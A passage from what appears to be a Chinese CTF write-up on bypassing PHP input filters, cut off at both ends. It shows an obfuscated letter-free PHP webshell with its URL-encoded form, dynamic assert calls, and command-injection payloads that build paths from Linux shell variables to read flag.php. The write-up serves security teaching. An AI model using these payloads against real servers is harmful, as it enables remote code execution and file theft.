class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[<span class="hljs-number">_</span>]);<br><br>//urlencode<br>shell=<span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%40</span><span class="hljs-meta">%22</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%5B</span><span class="hljs-string">&#x27;!&#x27;</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%3D</span><span class="hljs-string">&#x27;%40&#x27;</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3D</span><span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>(<span class="hljs-meta">%24_</span><span class="hljs-meta">%5B_</span><span class="hljs-meta">%5D</span>)<span class="hljs-meta">%3B</span><br></code></pre></td></tr></table></figure><p>但是这种方式得到的payload过长，万一有长度限制就无法bypass；另外assert函数在php5中可以作为动态函数名来执行代码，类似于</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a=<span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span><br>$b=<span class="hljs-string">&#x27;phpinfo();&#x27;</span><span class="hljs-comment">;</span><br>$a($b)<br></code></pre></td></tr></table></figure><p>但在php7中，assert不再作为函数使用，而是变成了语言结构(类似eval)，所以这种自增payload在php7也会失效。但我们依然可以采用上面提到的取反的方式进行函数动态调用。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>不包含字母与数字的webshell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>webshell<br>@<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;#./&#124;&#123;&#x27;</span>^<span class="hljs-string">&#x27;&#124;~`//&#x27;</span>;<span class="hljs-variable">$&#123;$__&#125;</span>[!<span class="hljs-variable">$_</span>](<span class="hljs-variable">$&#123;$__&#125;</span>[<span class="hljs-variable">$_</span>]);<br><br><span class="hljs-regexp">//</span>post<br><span class="hljs-number">0</span>=assert&amp;<span class="hljs-number">1</span>=phpinfo();<br></code></pre></td></tr></table></figure><h3 id="8-linux内置变量"><a href="#8-linux内置变量" class="headerlink" title="8.linux内置变量"></a>8.linux内置变量</h3><p>使用环境内置变量我们可以获取需要的字符。</p><p>首先介绍几个linux内置变量</p><blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$PATH</span>环境变量，可执行文件的搜索路径</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$PWD</span>当前所在目录，比如在ctf环境中是/var/www/html</span><br><br><span class="hljs-symbol">$</span>&#123;#&lt;var&gt;&#125;计算变量var的长度<br><br><span class="hljs-meta"><span class="hljs-keyword">$RANDOM</span>产生0 - 32767之间的随机数</span><br><br>例如：echo <span class="hljs-symbol">$</span>\&#123;\#RANDOM\&#125; 表示随机整数的位数也就是<span class="hljs-number">1</span><span class="hljs-number">-5</span>之间任意一个数。<br><br><span class="hljs-meta"><span class="hljs-keyword">$SHLVL</span>记录多个 Bash 进程实例嵌套深度的累加器 其**默认初始值为1**</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$USER</span>获取当前用户名例如：www-data</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$PHP</span>_VERSION获取当前php版本例如：echo $\&#123;PHP_VERSION\&#125;</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$HOME</span>用户的home目录，一般是/home/username</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$HOSTNAME</span> 主机名称</span><br></code></pre></td></tr></table></figure></blockquote><p>然后是一些字符截取操作</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>linux中可以用`~`获取变量的最后几位<br> <br> echo <span class="hljs-variable">$&#123;PWD:~0&#125;</span>  <span class="hljs-regexp">//</span>截取前目录的最后一个字符<br> <br><span class="hljs-regexp">//</span>同时可以用`::`获取变量的前几位<br> <br>echo <span class="hljs-variable">$&#123;PWD::0&#125;</span> <span class="hljs-regexp">//</span>截取当前目录的第一个字符也就是 /<br> <br><span class="hljs-regexp">//</span>用`<span class="hljs-variable">$&#123;#变量&#125;</span>`显示变量的长度<br> <br>echo <span class="hljs-variable">$&#123;#IFS&#125;</span>  <span class="hljs-regexp">//</span><span class="hljs-number">3</span><br>echo <span class="hljs-variable">$&#123;#&#125;</span><span class="hljs-regexp">//</span><span class="hljs-number">0</span><br>echo <span class="hljs-variable">$&#123;#?&#125;</span>  <span class="hljs-regexp">//</span><span class="hljs-number">1</span><br> <br>注意一个特殊情况:`<span class="hljs-variable">$&#123;#?&#125;</span>==<span class="hljs-number">1</span>`因此我们可以使用<span class="hljs-variable">$&#123;#?&#125;</span>来代替<span class="hljs-variable">$SHLVL</span>产生<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>$? 的奇妙用法：</strong></p><p>$?表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p><p>为什么有 &lt;A<code>&lt;A</code>返回的错误值 使得<code>$?</code>为1</p></blockquote><p>一些常用的payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># nl flag.php</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>&#125;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br><span class="hljs-comment">#/bin/cat flag.php</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? </span><br><span class="hljs-comment">#或</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><br><span class="hljs-comment">#/bin/base64 flag.php  由于RANDOM所以需要多尝试几次</span><br>code=<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="hljs-comment">#或</span><br>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?  <br><br></code></pre></td></tr></table></figure><h3 id="9-超过PRCE回溯限制绕正则"><a href="#9-超过PRCE回溯限制绕正则" class="headerlink" title="9.超过PRCE回溯限制绕正则"></a>9.超过PRCE回溯限制绕正则</h3><p>参考p牛文章<a href="https://www.freebuf.com/articles/web/190794.html">https://www.freebuf.com/articles/web/190794.html</a></p><p>写文件，但文件中不允许输入任何php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span 